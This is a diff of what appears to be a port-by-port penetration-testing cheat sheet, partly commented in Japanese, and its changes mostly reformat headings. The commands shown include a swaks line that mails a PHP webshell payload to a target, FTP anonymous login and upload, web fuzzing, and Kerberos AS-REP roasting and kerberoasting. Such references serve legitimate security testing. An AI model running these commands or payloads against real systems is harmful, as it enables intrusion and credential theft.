@@ -4,23 +4,21 @@
 - `nmap -n -Pn -sV --script vuln 'IP'`
 
 
-
 ## 21
-### curl
+- curl
 ```sh
 # upload
 curl -s -T 'FILE' --user 'USERNAME:PASSWORD' ftp://'IP'
 ```
-### nmap
+- nmap
 ```sh
 # anonymous login
 nmap -n -Pn -p21 --script=ftp-anon 'IP'
 ```
 
 
-
 ## 22
-### ssh
+- ssh
 ```sh
 chmod 600 'SECRETKEY'
 ssh -i 'SECRETKEY' 'USERNAME@IP'
@@ -29,37 +27,36 @@ ssh -i 'SECRETKEY' 'USERNAME@IP'
 
 
 ## 25
-### swaks
+- swaks
 ```sh
 # send webshell
 swaks -f 'FROM_USERNAME@DOMAIN' -t 'TO_USERNAME@DOMAIN' -d '<?php system($_REQUEST["cmd"]); ?>' -s 'IP'
 ```
 
 
-
 ## 80
-### cadaver
+- cadaver
 ```sh
 # connect to webdav
 cadaver 'URL'
 ```
-### curl
+- curl
 ```sh
 curl -I 'URL'
 curl -X OPTIONS -I 'URL'
 curl -ks 'URL'
 ```
-### davtest
+- davtest
 ```sh
 # test webdav
 davtest -url 'URL' -cleanup
 ```
-### ffuf
+- ffuf
 ```sh
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 'URL'/FUZZ
 ```
-### nmap
+- nmap
 ```sh
 nmap -n -Pn -p80 --script=http-methods 'IP'
 ```
@@ -76,20 +73,23 @@ nmap -n -Pn -p80 --script=http-methods 'IP'
 
 
 ## 88
-### impacket
+- impacket-GetNPUsers
 ```sh
 # userenum & asreproast
 impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DOMAIN'
 impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -no-pass 'DOMAIN/USERNAME'
+```
+- impacket-GetUserSPNs
+```
 # kerberoasting (TCP389番も必要)
 impacket-GetUserSPNs -outputfile 'FILE' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
 ```
-### kerbrute
+- kerbrute
 ```sh
 # userenum
 ./kerbrute_linux_amd64 userenum --dc 'IP' -d 'DOMAIN' 'USERLIST'
 ```
-### netexec
+- netexec
 ```sh
 # ASREPRoast (TCP389番も必要)
 netexec ldap 'IP' -u 'USERLIST' -p '' --asreproast 'FILE'
@@ -99,14 +99,12 @@ netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoast
 ```
 
 
-
 ## 123 (UDP)
-### ntpdate
+- ntpdate
 ```sh
 # sync date
 sudo ntpdate 'IP'
 ```
-
 
 
 ## 135
